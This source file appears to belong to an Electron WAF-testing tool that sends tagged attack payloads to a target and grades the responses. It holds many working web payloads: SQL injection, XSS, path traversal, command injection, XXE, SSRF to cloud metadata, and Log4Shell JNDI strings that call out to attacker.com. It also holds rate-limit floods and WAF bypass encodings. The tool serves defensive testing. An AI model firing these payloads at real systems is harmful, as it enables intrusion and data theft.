const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
const path = require('path');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const fs = require('fs');

let mainWindow;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1280,
    height: 900,
    minWidth: 1024,
    minHeight: 700,
    backgroundColor: '#0d1117',
    titleBarStyle: 'hidden',
    titleBarOverlay: {
      color: '#0d1117',
      symbolColor: '#58a6ff',
      height: 36
    },
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false
    },
    icon: path.join(__dirname, '../build/icon.ico')
  });

  mainWindow.loadFile(path.join(__dirname, 'renderer/index.html'));
}

app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

// ──────────────────────────────────────────────
// Core HTTP fetch used by all test modules
// Supports optional routing through a Burp/HTTP proxy
// ──────────────────────────────────────────────
function makeRequest(options, postData = null, proxyOptions = null) {
  return new Promise((resolve) => {
    const startTime = Date.now();

    let proto = options.protocol === 'https:' ? https : http;
    let reqOptions = { ...options };

    // Route through proxy (e.g. Burp Suite) if configured
    if (proxyOptions?.enabled && proxyOptions?.host && proxyOptions?.port) {
      // Always connect to the proxy over plain HTTP;
      // Burp will handle the upstream TLS itself.
      proto = http;
      const targetPort = options.port || (options.protocol === 'https:' ? 443 : 80);
      reqOptions = {
        hostname: proxyOptions.host,
        port: proxyOptions.port,
        // Send absolute-form request target so Burp knows where to forward
        path: `${options.protocol}//${options.hostname}:${targetPort}${options.path}`,
        method: options.method || 'GET',
        headers: {
          ...options.headers,
          Host: options.hostname, // Preserve original Host header
        },
        rejectUnauthorized: false,
      };
    }

    const req = proto.request(reqOptions, (res) => {
      let body = '';
      res.on('data', chunk => { body += chunk; });
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: body.substring(0, 500),
          latency: Date.now() - startTime,
          error: null
        });
      });
    });

    req.on('error', (err) => {
      resolve({
        status: null,
        headers: {},
        body: '',
        latency: Date.now() - startTime,
        error: err.message
      });
    });

    req.setTimeout(10000, () => {
      req.destroy();
      resolve({
        status: null,
        headers: {},
        body: '',
        latency: 10000,
        error: 'Request timed out'
      });
    });

    if (postData) req.write(postData);
    req.end();
  });
}

// ──────────────────────────────────────────────
// Convenience wrapper — threads proxy config from
// runOptions into every makeRequest call so callers
// don't have to extract it manually each time.
// ──────────────────────────────────────────────
function makeProxiedRequest(options, postData, runOptions) {
  return makeRequest(options, postData, runOptions?.proxy ?? null);
}

// ──────────────────────────────────────────────
// User-Agent pool for rotation
// ──────────────────────────────────────────────
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];
let uaIndex = 0;
function nextUA() {
  const ua = USER_AGENTS[uaIndex % USER_AGENTS.length];
  uaIndex++;
  return ua;
}

function buildOptions(targetUrl, overrides = {}, runOptions = {}) {
  const parsed = new URL(targetUrl);
  const ua = runOptions.rotateUA ? nextUA()
    : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';

  const headers = {
    'User-Agent': ua,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'close',
  };

  // X-WAF-Tester header — opt-in only
  if (runOptions.sendWafHeader) {
    headers['X-WAF-Tester'] = 'waf-tester';
  }

  // Authentication
  if (runOptions.auth) {
    const { type, value, headerName, user, pass } = runOptions.auth;
    if (type === 'bearer' && value)   headers['Authorization'] = `Bearer ${value}`;
    if (type === 'apikey' && value)   headers[headerName || 'X-API-Key'] = value;
    if (type === 'cookie' && value)   headers['Cookie'] = value;
    if (type === 'basic' && user)     headers['Authorization'] = 'Basic ' +
      Buffer.from(`${user}:${pass}`).toString('base64');
  }

  return {
    protocol: parsed.protocol,
    hostname: parsed.hostname,
    port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
    path: parsed.pathname + parsed.search,
    method: 'GET',
    headers,
    rejectUnauthorized: false,
    ...overrides
  };
}

// ──────────────────────────────────────────────
// Evaluate a response: did the WAF block it?
// Returns: { blocked, confidence, reason }
// confidence: 'high' | 'likely' | 'uncertain' | 'bypassed'
// ──────────────────────────────────────────────
function evaluateBlock(res, baseline = null) {
  if (res.error) return { blocked: null, confidence: 'uncertain', reason: `Network error: ${res.error}` };

  const hardBlockStatuses = new Set([403, 406, 429]);
  const softBlockStatuses = new Set([400, 405, 503]);
  const wafBodyKeywords = ['blocked', 'forbidden', 'access denied', 'waf', 'firewall',
    'security violation', 'rejected', 'not acceptable', 'request denied', 'threat detected'];

  const bodyLower = (res.body || '').toLowerCase();
  const hasWafKeyword = wafBodyKeywords.some(kw => bodyLower.includes(kw));

  // Hard block: definitive WAF status codes
  if (hardBlockStatuses.has(res.status)) {
    return { blocked: true, confidence: 'high', reason: `HTTP ${res.status} — definitive block` };
  }

  // Baseline comparison: if we have a baseline, compare structural similarity
  if (baseline && res.status === baseline.status) {
    const baseLen = (baseline.body || '').length;
    const resLen = (res.body || '').length;
    const lenDiff = baseLen > 0 ? Math.abs(resLen - baseLen) / baseLen : 0;

    if (hasWafKeyword) {
      return { blocked: true, confidence: 'likely', reason: `HTTP ${res.status} matches baseline but body contains WAF keywords` };
    }
    if (lenDiff > 0.6 && resLen < baseLen) {
      return { blocked: true, confidence: 'uncertain', reason: `HTTP ${res.status} — response ${Math.round(lenDiff * 100)}% shorter than baseline (possible block page)` };
    }
    return { blocked: false, confidence: 'bypassed', reason: `HTTP ${res.status} — response matches baseline structure, payload reached origin` };
  }

  // Soft block statuses (could be legitimate app errors or WAF blocks)
  if (softBlockStatuses.has(res.status)) {
    if (hasWafKeyword) {
      return { blocked: true, confidence: 'likely', reason: `HTTP ${res.status} with WAF keywords in body` };
    }
    if (baseline && res.status !== baseline.status) {
      return { blocked: true, confidence: 'uncertain', reason: `HTTP ${res.status} — differs from baseline ${baseline.status}, possible block` };
    }
    return { blocked: true, confidence: 'uncertain', reason: `HTTP ${res.status} — may be WAF block or legitimate app error` };
  }

  // WAF keyword in body on a 200
  if (hasWafKeyword) {
    return { blocked: true, confidence: 'likely', reason: `HTTP ${res.status} but body contains WAF keywords` };
  }

  // Everything else: not blocked
  return { blocked: false, confidence: 'bypassed', reason: `HTTP ${res.status} — payload reached origin` };
}

// ══════════════════════════════════════════════
// ══════════════════════════════════════════════
// TEST SUITES
// Compliance tag format:
//   OWASP:A03  = OWASP Top 10 2021 category
//   CWE-89     = Common Weakness Enumeration
//   NIST:SI-10 = NIST 800-53 control
//   PCI:6.4    = PCI-DSS 4.0 Requirement 6.4
// ══════════════════════════════════════════════

function makeResult(t, res, eval_) {
  return {
    id: t.id, name: t.name, category: t.category,
    tags: t.tags || [],
    payload: (t.payloadDesc || t.payload || '').substring(0, 80),
    status: res.status, latency: res.latency,
    blocked: eval_.blocked, confidence: eval_.confidence, reason: eval_.reason
  };
}

// 1. OWASP / CWE Core Tests
async function runOwaspTests(targetUrl, sendProgress, runOptions, baseline) {
  runOptions = runOptions || {};
  const tests = [
    { id:'sqli-1',  name:'SQLi - Classic OR',                category:'SQL Injection',        tags:['OWASP:A03','CWE-89','NIST:SI-10','PCI:6.4'],  payload:"' OR '1'='1",                           paramMode:'query' },
    { id:'sqli-2',  name:'SQLi - UNION SELECT',              category:'SQL Injection',        tags:['OWASP:A03','CWE-89','NIST:SI-10','PCI:6.4'],  payload:"' UNION SELECT 1,2,3--",                 paramMode:'query' },
    { id:'sqli-3',  name:'SQLi - Blind time delay',          category:'SQL Injection',        tags:['OWASP:A03','CWE-89','NIST:SI-10','PCI:6.4'],  payload:"'; WAITFOR DELAY '0:0:5'--",              paramMode:'query' },
    { id:'sqli-4',  name:'SQLi - Error-based (extractvalue)',category:'SQL Injection',        tags:['OWASP:A03','CWE-89','NIST:SI-10'],             payload:"' AND extractvalue(1,concat(0x7e,version()))--", paramMode:'query' },
    { id:'sqli-5',  name:'SQLi - Stacked queries',           category:'SQL Injection',        tags:['OWASP:A03','CWE-89','NIST:SI-10','PCI:6.4'],  payload:"'; DROP TABLE users--",                   paramMode:'query' },
    { id:'sqli-6',  name:'SQLi - Hex encoding',              category:'SQL Injection',        tags:['OWASP:A03','CWE-89','NIST:SI-10'],             payload:"' OR 0x313d31--",                         paramMode:'query' },
    { id:'sqli-7',  name:'SQLi - Comment bypass (/**/ )',    category:'SQL Injection',        tags:['OWASP:A03','CWE-89','NIST:SI-10'],             payload:"'/**/OR/**/1=1--",                        paramMode:'query' },
    { id:'sqli-8',  name:'SQLi - Out-of-band DNS',           category:'SQL Injection',        tags:['OWASP:A03','CWE-89'],                          payload:"'; EXEC master..xp_dirtree '//attacker.com/a'--", paramMode:'query' },
    { id:'sqli-9',  name:'SQLi - MySQL SLEEP',               category:'SQL Injection',        tags:['OWASP:A03','CWE-89','NIST:SI-10'],             payload:"' OR SLEEP(5)--",                         paramMode:'query' },
    { id:'sqli-10', name:'SQLi - Whitespace tab bypass',     category:'SQL Injection',        tags:['OWASP:A03','CWE-89'],                          payload:"'\tOR\t'1'='1",                           paramMode:'query' },
    { id:'sqli-11', name:'SQLi - Boolean blind',             category:'SQL Injection',        tags:['OWASP:A03','CWE-89','NIST:SI-10','PCI:6.4'],  payload:"' AND 1=1--",                             paramMode:'query' },
    { id:'sqli-12', name:'SQLi - Second-order (stored)',     category:'SQL Injection',        tags:['OWASP:A03','CWE-89'],                          payload:"admin'--",                                paramMode:'query' },
    { id:'xss-1',   name:'XSS - Script tag',                 category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79','NIST:SI-10','PCI:6.4'],  payload:'<script>alert(1)</script>',               paramMode:'query' },
    { id:'xss-2',   name:'XSS - img onerror',                category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79','NIST:SI-10','PCI:6.4'],  payload:'<img src=x onerror=alert(1)>',            paramMode:'query' },
    { id:'xss-3',   name:'XSS - SVG onload',                 category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79','NIST:SI-10'],             payload:'<svg onload=alert(1)>',                   paramMode:'query' },
    { id:'xss-4',   name:'XSS - DOM javascript: URI',        category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79'],                          payload:'javascript:alert(document.domain)',       paramMode:'query' },
    { id:'xss-5',   name:'XSS - Polyglot payload',           category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79','NIST:SI-10'],             payload:"jaVasCript:/*`/*'/*\"/**/(oNcliCk=alert())//%0D%0A//</stYle/</titLe/</scRipt/--!><sVg/oNloAd=alert()>", paramMode:'query' },
    { id:'xss-6',   name:'XSS - onfocus autofocus',          category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79'],                          payload:'<input onfocus=alert(1) autofocus>',      paramMode:'query' },
    { id:'xss-7',   name:'XSS - CSS @import',                category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79'],                          payload:'<style>@import "javascript:alert(1)"</style>', paramMode:'query' },
    { id:'xss-8',   name:'XSS - HTML entity bypass',         category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79'],                          payload:'&lt;script&gt;alert(1)&lt;/script&gt;',  paramMode:'query' },
    { id:'xss-9',   name:'XSS - Template literal',           category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79'],                          payload:'${alert(1)}',                            paramMode:'query' },
    { id:'xss-10',  name:'XSS - Markdown link injection',    category:'Cross-Site Scripting', tags:['OWASP:A03','CWE-79'],                          payload:'[click](javascript:alert(1))',            paramMode:'query' },
    { id:'lfi-1',   name:'Path Traversal - dot-dot-slash',   category:'Path Traversal',       tags:['OWASP:A01','CWE-22','NIST:AC-3','PCI:6.4'],   payload:'../../../etc/passwd',                    paramMode:'path' },
    { id:'lfi-2',   name:'Path Traversal - URL encoded',     category:'Path Traversal',       tags:['OWASP:A01','CWE-22','NIST:AC-3','PCI:6.4'],   payload:'..%2F..%2F..%2Fetc%2Fpasswd',            paramMode:'path' },
    { id:'lfi-3',   name:'Path Traversal - double encoded',  category:'Path Traversal',       tags:['OWASP:A01','CWE-22','NIST:AC-3'],              payload:'..%252F..%252F..%252Fetc%252Fpasswd',     paramMode:'path' },
    { id:'lfi-4',   name:'Path Traversal - Windows path',    category:'Path Traversal',       tags:['OWASP:A01','CWE-22','NIST:AC-3'],              payload:'..\\..\\..\\windows\\win.ini',              paramMode:'path' },
    { id:'cmdi-1',  name:'Command Injection - semicolon',    category:'Command Injection',    tags:['OWASP:A03','CWE-78','NIST:SI-10','PCI:6.4'],  payload:'; cat /etc/passwd',                      paramMode:'query' },
    { id:'cmdi-2',  name:'Command Injection - pipe',         category:'Command Injection',    tags:['OWASP:A03','CWE-78','NIST:SI-10','PCI:6.4'],  payload:'| whoami',                               paramMode:'query' },
    { id:'cmdi-3',  name:'Command Injection - backtick',     category:'Command Injection',    tags:['OWASP:A03','CWE-78','NIST:SI-10'],             payload:'`id`',                                   paramMode:'query' },
    { id:'cmdi-4',  name:'Command Injection - $() subshell', category:'Command Injection',    tags:['OWASP:A03','CWE-78','NIST:SI-10'],             payload:'$(id)',                                   paramMode:'query' },
    { id:'xxe-1',   name:'XXE - File disclosure',            category:'XXE Injection',        tags:['OWASP:A05','CWE-611','NIST:SI-10','PCI:6.4'], payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', paramMode:'body', contentType:'application/xml' },
    { id:'xxe-2',   name:'XXE - SSRF via DTD',               category:'XXE Injection',        tags:['OWASP:A05','CWE-611','NIST:SI-10'],            payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', paramMode:'body', contentType:'application/xml' },
    { id:'ssrf-1',  name:'SSRF - localhost admin',           category:'SSRF',                 tags:['OWASP:A10','CWE-918','NIST:AC-3','PCI:6.4'],  payload:'http://localhost/admin',                 paramMode:'query' },
    { id:'ssrf-2',  name:'SSRF - AWS metadata',              category:'SSRF',                 tags:['OWASP:A10','CWE-918','NIST:AC-3','PCI:6.4'],  payload:'http://169.254.169.254/latest/meta-data/', paramMode:'query' },
    { id:'ssrf-3',  name:'SSRF - GCP metadata',              category:'SSRF',                 tags:['OWASP:A10','CWE-918','NIST:AC-3'],             payload:'http://metadata.google.internal/computeMetadata/v1/', paramMode:'query' },
    { id:'ssrf-4',  name:'SSRF - file:// protocol',          category:'SSRF',                 tags:['OWASP:A10','CWE-918'],                         payload:'file:///etc/passwd',                     paramMode:'query' },
    { id:'log4j-1', name:'Log4Shell - JNDI LDAP',            category:'Known CVE',            tags:['OWASP:A06','CWE-917','NIST:SI-2','PCI:6.4'],  payload:'${jndi:ldap://attacker.com/a}',          paramMode:'header', headerName:'X-Api-Version' },
    { id:'log4j-2', name:'Log4Shell - JNDI RMI variant',     category:'Known CVE',            tags:['OWASP:A06','CWE-917','NIST:SI-2'],             payload:'${jndi:rmi://attacker.com/a}',            paramMode:'header', headerName:'User-Agent' },
    { id:'log4j-3', name:'Log4Shell - Nested bypass',        category:'Known CVE',            tags:['OWASP:A06','CWE-917','NIST:SI-2'],             payload:'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}', paramMode:'header', headerName:'X-Forwarded-For' },
    { id:'ssti-1',  name:'SSTI - Jinja2 math probe',         category:'SSTI',                 tags:['OWASP:A03','CWE-94','NIST:SI-10'],             payload:'{{7*7}}',                                paramMode:'query' },
    { id:'ssti-2',  name:"SSTI - Twig/Smarty probe",         category:'SSTI',                 tags:['OWASP:A03','CWE-94','NIST:SI-10'],             payload:"{{7*'7'}}",                              paramMode:'query' },
    { id:'redir-1', name:'Open Redirect - absolute URL',     category:'Open Redirect',        tags:['OWASP:A01','CWE-601','NIST:AC-3'],             payload:'https://evil.attacker.com',              paramMode:'query' },
    { id:'redir-2', name:'Open Redirect - protocol-relative',category:'Open Redirect',        tags:['OWASP:A01','CWE-601','NIST:AC-3'],             payload:'//attacker.com/phish',                   paramMode:'query' },
  ];

  const results = [];
  for (let i = 0; i < tests.length; i++) {
    const t = tests[i];
    sendProgress({ current: i + 1, total: tests.length, name: t.name });
    const parsed = new URL(targetUrl);
    let opts;
    if (t.paramMode === 'query') {
      parsed.searchParams.set('q', t.payload);
      opts = buildOptions(parsed.toString(), {}, runOptions);
    } else if (t.paramMode === 'path') {
      opts = buildOptions(targetUrl, {}, runOptions);
      opts.path = '/' + t.payload;
    } else if (t.paramMode === 'header') {
      opts = buildOptions(targetUrl, {}, runOptions);
      opts.headers[t.headerName] = t.payload;
    } else if (t.paramMode === 'body') {
      opts = buildOptions(targetUrl, { method: 'POST' }, runOptions);
      opts.headers['Content-Type'] = t.contentType;
      opts.headers['Content-Length'] = Buffer.byteLength(t.payload);
    }
    const res = await makeProxiedRequest(opts, t.paramMode === 'body' ? t.payload : null, runOptions);
    results.push(makeResult(t, res, evaluateBlock(res, baseline)));
    await sleep(200);
  }
  return results;
}

// 2. Rate Limiting
async function runRateLimitTests(targetUrl, sendProgress, runOptions) {
  runOptions = runOptions || {};
  const results = [];
  const blockingStatuses = new Set([400, 403, 429, 503]);
  const isBlocked = r => r.error ? false : blockingStatuses.has(r.status);

  sendProgress({ current: 1, total: 3, name: 'Burst flood (30 req)' });
  const burstResults = await Promise.all(
    Array.from({ length: 30 }, () => makeProxiedRequest(buildOptions(targetUrl, {}, runOptions), null, runOptions))
  );
  const burstBlocked = burstResults.filter(isBlocked).length;
  const burst429 = burstResults.filter(r => r.status === 429).length;
  const burst403 = burstResults.filter(r => r.status === 403).length;
  results.push({ id:'rl-burst', name:'Burst Flood (30 simultaneous)', category:'Rate Limiting',
    tags:['OWASP:A04','CWE-400','NIST:SC-5','PCI:6.4'], payload:'30 concurrent GET requests',
    status: burst429 > 0 ? 429 : burst403 > 0 ? 403 : burstResults[0].status,
    latency: Math.max(...burstResults.map(r => r.latency)), blocked: burstBlocked >= 6,
    confidence: burstBlocked >= 15 ? 'high' : burstBlocked >= 6 ? 'likely' : burstBlocked > 0 ? 'uncertain' : 'bypassed',
    reason: burstBlocked + ' / 30 blocked (429: ' + burst429 + ', 403: ' + burst403 + ') - threshold: >=6' });

  sendProgress({ current: 2, total: 3, name: 'Sequential flood (20 req / 100ms)' });
  const seqResults = [];
  for (let i = 0; i < 20; i++) {
    seqResults.push(await makeProxiedRequest(buildOptions(targetUrl, {}, runOptions), null, runOptions));
    await sleep(100);
  }
  const seqBlocked = seqResults.filter(isBlocked).length;
  const seq429 = seqResults.filter(r => r.status === 429).length;
  results.push({ id:'rl-seq', name:'Sequential Flood (20 req @ 100ms)', category:'Rate Limiting',
    tags:['OWASP:A04','CWE-400','NIST:SC-5','PCI:6.4'], payload:'20 sequential GET requests, 100ms apart',
    status: seq429 > 0 ? 429 : seqResults[seqResults.length - 1].status,
    latency: seqResults.reduce((a, r) => a + r.latency, 0), blocked: seqBlocked >= 1,
    confidence: seqBlocked >= 5 ? 'high' : seqBlocked >= 1 ? 'likely' : 'bypassed',
    reason: seqBlocked + ' / 20 blocked (429: ' + seq429 + ') - threshold: >=1' });

  sendProgress({ current: 3, total: 3, name: 'IP spoof bypass (X-Forwarded-For)' });
  const spoofResults = await Promise.all(Array.from({ length: 15 }, (_, i) => {
    const opts = buildOptions(targetUrl, {}, runOptions);
    opts.headers['X-Forwarded-For'] = '10.0.0.' + (i + 1);
    opts.headers['X-Real-IP'] = '10.0.0.' + (i + 1);
    return makeProxiedRequest(opts, null, runOptions);
  }));
  const spoofBlocked = spoofResults.filter(isBlocked).length;
  results.push({ id:'rl-spoof', name:'Rate Limit Bypass (X-Forwarded-For rotation)', category:'Rate Limiting',
    tags:['OWASP:A04','CWE-400','NIST:SC-5'], payload:'X-Forwarded-For: 10.0.0.1-15',
    status: spoofBlocked > 0 ? spoofResults.find(isBlocked).status : spoofResults[0].status,
    latency: Math.max(...spoofResults.map(r => r.latency)), blocked: spoofBlocked >= 3,
    confidence: spoofBlocked >= 8 ? 'high' : spoofBlocked >= 3 ? 'likely' : spoofBlocked > 0 ? 'uncertain' : 'bypassed',
    reason: spoofBlocked + ' / 15 blocked despite spoofed IPs - bypass ' + (spoofBlocked < 3 ? 'SUCCEEDED (WAF trusts XFF)' : 'prevented') });
  return results;
}

// 3. Bot Detection
async function runBotTests(targetUrl, sendProgress, runOptions, baseline) {
  runOptions = runOptions || {};
  const tests = [
    { id:'bot-1',  name:'Missing User-Agent',     tags:['OWASP:A04','CWE-284','NIST:SI-3'],             ua:'',                                                                    desc:'Empty User-Agent header' },
    { id:'bot-2',  name:'Scanner - sqlmap',        tags:['OWASP:A04','CWE-284','NIST:SI-3','PCI:6.4'],  ua:'sqlmap/1.7.8#stable (https://sqlmap.org)',            desc:'sqlmap user-agent' },
    { id:'bot-3',  name:'Scanner - Nikto',         tags:['OWASP:A04','CWE-284','NIST:SI-3','PCI:6.4'],  ua:'Mozilla/5.00 (Nikto/2.1.6)',                          desc:'Nikto scanner UA' },
    { id:'bot-4',  name:'Scanner - Nmap NSE',      tags:['OWASP:A04','CWE-284','NIST:SI-3'],             ua:'Mozilla/5.0 Nmap Scripting Engine',                   desc:'Nmap NSE UA' },
    { id:'bot-5',  name:'Headless Chrome',         tags:['OWASP:A04','CWE-284','NIST:SI-3'],             ua:'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 HeadlessChrome/120.0.0.0', desc:'Headless Chrome UA' },
    { id:'bot-6',  name:'Python Requests',         tags:['OWASP:A04','CWE-284','NIST:SI-3'],             ua:'python-requests/2.31.0',                              desc:'Python requests library' },
    { id:'bot-7',  name:'curl UA',                 tags:['OWASP:A04','CWE-284','NIST:SI-3'],             ua:'curl/8.4.0',                                          desc:'curl user-agent' },
    { id:'bot-8',  name:'Scrapy Spider',           tags:['OWASP:A04','CWE-284','NIST:SI-3'],             ua:'Scrapy/2.11.0 (+https://scrapy.org)',                  desc:'Scrapy web scraper' },
    { id:'bot-9',  name:'Masscan',                 tags:['OWASP:A04','CWE-284','NIST:SI-3'],             ua:'masscan/1.3 (https://github.com/robertdavidgraham/masscan)', desc:'Port scanner UA' },
    { id:'bot-10', name:'No Accept header',        tags:['OWASP:A04','CWE-284'],                         ua:'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120',desc:'Missing Accept/Accept-Language', stripHeaders:true },
  ];
  const results = [];
  for (let i = 0; i < tests.length; i++) {
    const t = tests[i];
    sendProgress({ current: i + 1, total: tests.length, name: t.name });
    const opts = buildOptions(targetUrl, {}, Object.assign({}, runOptions, { rotateUA: false }));
    if (t.ua !== undefined) opts.headers['User-Agent'] = t.ua;
    if (t.stripHeaders) { delete opts.headers['Accept']; delete opts.headers['Accept-Language']; }
    const res = await makeProxiedRequest(opts, null, runOptions);
    results.push(makeResult(Object.assign({}, t, { category:'Bot Detection', payload:t.desc, payloadDesc:t.desc }), res, evaluateBlock(res, baseline)));
    await sleep(300);
  }
  return results;
}

// 4. Bypass Attempts
async function runBypassTests(targetUrl, sendProgress, runOptions, baseline) {
  runOptions = runOptions || {};
  const parsed = new URL(targetUrl);

  const qTest = (id, name, payload, desc, tags) => async () => {
    const url = new URL(targetUrl); url.searchParams.set('q', payload);
    const res = await makeProxiedRequest(buildOptions(url.toString(), {}, runOptions), null, runOptions);
    const ev = evaluateBlock(res, baseline);
    return { id, name, category:'Bypass', tags:tags||[], payload:desc||payload.substring(0,60), status:res.status, latency:res.latency, ...ev };
  };
  const hTest = (id, name, headers, desc, tags) => async () => {
    const opts = buildOptions(targetUrl, {}, runOptions);
    Object.assign(opts.headers, headers);
    try {
      const res = await makeProxiedRequest(opts, null, runOptions);
      const ev = evaluateBlock(res, baseline);
      return { id, name, category:'Bypass', tags:tags||[], payload:desc, status:res.status, latency:res.latency, ...ev };
    } catch(err) {
      return { id, name, category:'Bypass', tags:tags||[], payload:desc, status:null, latency:0, blocked:true, confidence:'high', reason:'Blocked by Node HTTP layer: '+err.message };
    }
  };
  const pTest = (id, name, path_, desc, tags) => async () => {
    const opts = buildOptions(targetUrl, {}, runOptions); opts.path = path_;
    const res = await makeProxiedRequest(opts, null, runOptions);
    const ev = evaluateBlock(res, baseline);
    return { id, name, category:'Bypass', tags:tags||[], payload:desc, status:res.status, latency:res.latency, ...ev };
  };

  const testFns = [
    qTest('bp-1', 'SQLi - Null byte bypass',           "' OR 1=1\x00--",                              'SQLi with null byte',              ['OWASP:A03','CWE-89','NIST:SI-10']),
    qTest('bp-2', 'SQLi - Case variation',             "' oR '1'='1",                                 'Mixed-case OR keyword',            ['OWASP:A03','CWE-89','NIST:SI-10']),
    qTest('bp-3', 'SQLi - Inline comment obfuscation', "' OR/**/1=1--",                               'SQL comment within payload',       ['OWASP:A03','CWE-89','NIST:SI-10']),
    qTest('bp-4', 'SQLi - Base64 encoded',             Buffer.from("' OR 1=1--").toString('base64'),  'Base64-encoded SQLi',              ['OWASP:A03','CWE-89']),
    qTest('bp-5', 'SQLi - URL encoded keywords',       '%27%20OR%20%271%27%3D%271',                   'URL-encoded SQLi',                 ['OWASP:A03','CWE-89','NIST:SI-10']),
    qTest('bp-6', 'XSS - Double URL-encode',           '%253Cscript%253Ealert(1)%253C%2Fscript%253E', 'Double-encoded <script>',          ['OWASP:A03','CWE-79','NIST:SI-10']),
    qTest('bp-7', 'XSS - Unicode fullwidth chars',     '\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E','Fullwidth Unicode <script>',      ['OWASP:A03','CWE-79','NIST:SI-10']),
    qTest('bp-8', 'XSS - HTML entity evasion',         '&lt;script&gt;alert(1)&lt;/script&gt;',      'HTML entities in payload',         ['OWASP:A03','CWE-79']),
    hTest('bp-9', 'Header injection (CRLF)',            { 'X-Custom': 'test\r\nX-Injected: evil' },   'CRLF in custom header',            ['OWASP:A03','CWE-113','NIST:SI-10']),
    hTest('bp-10','Host header injection',              { 'Host': 'evil.attacker.com' },               'Spoofed Host header',              ['OWASP:A01','CWE-284','NIST:AC-3']),
    hTest('bp-11','HTTP method override',               { 'X-HTTP-Method-Override':'DELETE','X-Method-Override':'DELETE' },'Method override headers',['OWASP:A01','CWE-284']),
    pTest('bp-12','Double slash path bypass',           '//' + parsed.pathname,                        'Double-slash path prefix',         ['OWASP:A01','CWE-22','NIST:AC-3']),
    pTest('bp-13','Semicolon path bypass',              parsed.pathname + ';/../admin',                'Semicolon path trick',             ['OWASP:A01','CWE-22','NIST:AC-3']),
    qTest('bp-14','Protocol-relative SSRF',            '//attacker.com/steal',                        'Protocol-relative URL',            ['OWASP:A10','CWE-918']),
    qTest('bp-15','Unicode path normalization',         '/\u2025/\u2025/etc/passwd',                   'Unicode path separator bypass',    ['OWASP:A01','CWE-22']),
  ];

  const results = [];
  for (let i = 0; i < testFns.length; i++) {
    const result = await testFns[i]();
    sendProgress({ current: i + 1, total: testFns.length, name: result.name });
    results.push(result);
    await sleep(250);
  }
  return results;
}

// 5. API Security Tests
async function runApiTests(targetUrl, sendProgress, runOptions, baseline) {
  runOptions = runOptions || {};
  const parsed = new URL(targetUrl);

  const doPost = async (body, extraHeaders) => {
    const opts = buildOptions(targetUrl, { method:'POST' }, runOptions);
    opts.headers['Content-Type'] = 'application/json';
    opts.headers['Content-Length'] = Buffer.byteLength(body);
    if (extraHeaders) Object.assign(opts.headers, extraHeaders);
    const res = await makeProxiedRequest(opts, body, runOptions);
    return { status:res.status, latency:res.latency, ...evaluateBlock(res, baseline) };
  };
  const doGet = async (extraHeaders, overridePath) => {
    const opts = buildOptions(targetUrl, {}, runOptions);
    if (extraHeaders) Object.assign(opts.headers, extraHeaders);
    if (overridePath) opts.path = overridePath;
    const res = await makeProxiedRequest(opts, null, runOptions);
    return { status:res.status, latency:res.latency, ...evaluateBlock(res, baseline) };
  };
  const doVerb = async (method) => {
    const opts = buildOptions(targetUrl, { method }, runOptions);
    const res = await makeProxiedRequest(opts, null, runOptions);
    return { status:res.status, latency:res.latency, ...evaluateBlock(res, baseline) };
  };

  const rawTests = [
    { id:'api-1',  name:'GraphQL Introspection',          tags:['OWASP:A05','CWE-284','NIST:AC-3'],           fn: ()=>doPost('{"query":"{__schema{types{name}}}"}') },
    { id:'api-2',  name:'GraphQL Batch Query Flood',       tags:['OWASP:A04','CWE-400','NIST:SC-5'],           fn: ()=>doPost(JSON.stringify(Array(10).fill({query:'{__typename}'}))) },
    { id:'api-3',  name:'GraphQL Field Enumeration',       tags:['OWASP:A05','CWE-284'],                       fn: ()=>doPost('{"query":"{__type(name:\\"User\\"){fields{name}}}"}') },
